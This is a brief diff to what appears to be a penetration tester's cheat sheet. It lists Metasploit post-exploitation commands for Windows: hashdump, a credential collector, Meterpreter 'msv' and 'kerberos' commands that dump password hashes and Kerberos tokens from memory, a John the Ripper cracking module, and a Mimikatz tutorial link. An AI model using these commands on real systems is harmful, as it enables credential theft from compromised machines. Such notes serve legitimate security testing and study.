@@ -1,6 +1,16 @@
 run post/windows/gather/hashdump
 run post/windows/gather/credentials/credential_collector
 
+# dump hashes from memory
+meterpreter > msv
+
+# dump kernberos tokens
+meterpreter > kerberos
+
 
 
 use auxiliary/analyze/jtr_crack_fast
+
+
+
+http://www.offensive-security.com/metasploit-unleashed/Mimikatz
